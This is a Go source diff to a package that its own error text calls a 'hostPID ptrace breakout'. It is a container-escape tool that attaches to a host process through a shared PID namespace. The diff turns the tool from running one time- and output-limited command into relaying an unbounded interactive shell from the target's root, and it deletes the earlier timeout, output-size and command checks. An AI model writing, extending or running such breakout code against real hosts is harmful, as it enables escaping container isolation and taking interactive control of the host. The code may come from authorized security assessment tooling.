@@ -1,5 +1,5 @@
-// Package hostpidptrace runs one bounded command from a disposable child of an
-// explicitly selected process at visible PID 1's namespace boundary.
+// Package hostpidptrace opens an interactive shell from a disposable child of
+// an explicitly selected process at visible PID 1's namespace boundary.
 package hostpidptrace
 
 import (
@@ -8,18 +8,14 @@ import (
 	"fmt"
 	"io"
 	"os"
-	"time"
 )
 
 const (
-	// WorkerArgument selects the private ptrace worker. The command and target
+	// WorkerArgument selects the private ptrace worker. Target and terminal
 	// metadata are transferred through anonymous pipes, never argv or env.
 	WorkerArgument = "--internal-hostpid-ptrace-worker"
 
-	DefaultTimeout     = 30 * time.Second
-	DefaultOutputLimit = int64(1024 * 1024)
-	MaxCommandBytes    = 4096
-	maxProtocolBytes   = 24*1024*1024 + MaxCommandBytes
+	maxProtocolBytes = 1024 * 1024
 )
 
 var ErrUnsupported = errors.New("hostPID ptrace breakout is supported only on Linux AMD64")
@@ -59,25 +55,26 @@ type ProbeResult struct {
 	Warnings      []string
 }
 
-// RunOptions configures one worker invocation.
-type RunOptions struct {
-	Target      Candidate
-	Command     string
-	Timeout     time.Duration
-	OutputLimit int64
+type terminalSpec struct {
+	Number   int      `json:"number"`
+	Identity Identity `json:"identity"`
+	DeviceID uint64   `json:"device_id"`
 }
 
-// Result separates the command result from cleanup/restoration evidence.
+// RunOptions configures one interactive worker invocation.
+type RunOptions struct {
+	Target   Candidate
+	Terminal terminalSpec
+}
+
+// Result separates the interactive shell result from cleanup/restoration evidence.
 type Result struct {
-	Output           []byte `json:"output"`
-	OutputTruncated  bool   `json:"output_truncated"`
-	CommandCompleted bool   `json:"command_completed"`
-	ExitCode         int    `json:"exit_code"`
-	Signal           int    `json:"signal"`
-	TargetRestored   bool   `json:"target_restored"`
-	TargetDetached   bool   `json:"target_detached"`
-	OutputRemoved    bool   `json:"output_removed"`
-	Stage            string `json:"stage"`
+	ShellExited    bool   `json:"shell_exited"`
+	ExitCode       int    `json:"exit_code"`
+	Signal         int    `json:"signal"`
+	TargetRestored bool   `json:"target_restored"`
+	TargetDetached bool   `json:"target_detached"`
+	Stage          string `json:"stage"`
 }
 
 // ConfirmationPhrase is deliberately PID-specific and exact.
@@ -89,28 +86,11 @@ func normalizeRunOptions(options RunOptions) (RunOptions, error) {
 	if options.Target.PID <= 1 {
 		return options, errors.New("a disposable target PID greater than 1 is required")
 	}
-	if len(options.Command) == 0 {
-		return options, errors.New("a non-empty host command is required")
+	if options.Terminal.Number < 0 || options.Terminal.Number > 1_000_000 {
+		return options, errors.New("host terminal number is invalid")
 	}
-	if len(options.Command) > MaxCommandBytes {
-		return options, fmt.Errorf("host command exceeds %d bytes", MaxCommandBytes)
-	}
-	for _, value := range []byte(options.Command) {
-		if value == 0 {
-			return options, errors.New("host command contains a NUL byte")
-		}
-	}
-	if options.Timeout <= 0 {
-		options.Timeout = DefaultTimeout
-	}
-	if options.Timeout > 5*time.Minute {
-		return options, errors.New("host command timeout exceeds 5 minutes")
-	}
-	if options.OutputLimit <= 0 {
-		options.OutputLimit = DefaultOutputLimit
-	}
-	if options.OutputLimit > 16*1024*1024 {
-		return options, errors.New("host command output limit exceeds 16 MiB")
+	if options.Terminal.Identity == (Identity{}) || options.Terminal.DeviceID == 0 {
+		return options, errors.New("host terminal identity is invalid")
 	}
 	return options, nil
 }
@@ -118,17 +98,18 @@ func normalizeRunOptions(options RunOptions) (RunOptions, error) {
 // Probe performs read-only preflight and candidate enumeration.
 func Probe(ctx context.Context) (ProbeResult, error) { return probePlatform(ctx) }
 
-// Launch sends a bounded request to a private re-exec worker.
-func Launch(ctx context.Context, options RunOptions) (Result, error) {
-	options, err := normalizeRunOptions(options)
-	if err != nil {
-		return Result{}, err
+// Launch opens a PTY from the selected target's root and relays one interactive
+// shell through a private re-exec worker. terminalFD is -1 for non-terminal
+// input and otherwise names the local terminal used for resize propagation.
+func Launch(ctx context.Context, target Candidate, input io.Reader, output io.Writer, terminalFD int) (Result, error) {
+	if target.PID <= 1 {
+		return Result{}, errors.New("a disposable target PID greater than 1 is required")
 	}
-	return launchWorker(ctx, options)
+	return launchInteractive(ctx, target, input, output, terminalFD)
 }
 
 // RunWorker handles the private worker mode using inherited request and result
-// pipes. It returns the process exit status; diagnostics contain no command.
+// pipes. It returns the process exit status; diagnostics contain no shell input.
 func RunWorker(args []string, request, response io.ReadWriter, stderr io.Writer) int {
 	if len(args) != 0 {
 		fmt.Fprintln(stderr, "[hostpid-ptrace-breakout] internal worker does not accept arguments")
